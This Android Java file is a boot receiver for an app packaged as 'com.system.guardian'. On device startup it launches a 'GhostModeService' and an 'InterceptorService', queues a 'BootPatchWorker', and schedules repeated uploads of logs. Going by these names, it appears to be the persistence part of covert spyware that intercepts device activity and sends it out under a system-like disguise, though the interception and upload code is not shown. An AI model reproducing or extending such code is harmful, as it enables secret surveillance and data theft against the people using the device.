package com.system.guardian;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import androidx.work.OneTimeWorkRequest;
import androidx.work.WorkManager;

import com.system.guardian.background.BootPatchWorker;
import com.system.guardian.background.LogUploadWorker;
import com.system.guardian.background.UploadScheduler;
import com.system.guardian.core.LogUploader;

public class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        GhostModeService.start(context);
        if (intent == null || context == null) return;

        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
            try {
                startCoreServices(context);
                scheduleLogUpload(context);
                LogUploader.uploadLog(context, "[BOOT] 🛠️ Device rebooted - services initialized.");
            } catch (Exception e) {
                LogUploader.uploadLog(context, "[BOOT-ERROR] ❌ Failed to start services: " + e.getMessage());
            }
        }
    }

    private void startCoreServices(Context context) {
        context.startService(new Intent(context, InterceptorService.class));
    }

    private void scheduleLogUpload(Context context) {
        WorkManager wm = WorkManager.getInstance(context);

        wm.enqueue(new OneTimeWorkRequest.Builder(LogUploadWorker.class).build());
        wm.enqueue(new OneTimeWorkRequest.Builder(BootPatchWorker.class).build());

        UploadScheduler.schedulePeriodicLogUpload(context);
    }
}
